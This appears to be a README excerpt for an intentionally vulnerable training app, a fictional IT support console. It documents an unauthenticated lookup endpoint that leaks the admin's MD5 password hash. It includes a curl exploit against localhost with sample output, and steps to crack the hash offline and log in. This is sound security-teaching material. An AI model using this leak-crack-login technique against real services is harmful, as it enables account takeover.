...
WonderCorp's IT Support Console. `GET /api/users/{username}/lookup` is an old
support-tooling endpoint that was never removed.

**Play it in the browser** — open http://localhost:9002, look up the `admin`
account to leak its MD5 hash, crack it externally (CrackStation/hashcat/john),
then sign in with the recovered password.
...
The account-lookup endpoint hands the hash to anyone who asks, no auth required.

## Exploit

```bash
curl -s http://localhost:9002/api/users/admin/lookup
# {"username":"admin","fullName":"WonderCorp Admin","department":"IT","password_md5":"0d107d09f5bbe40cade3de5c71e9e9b7"}
```
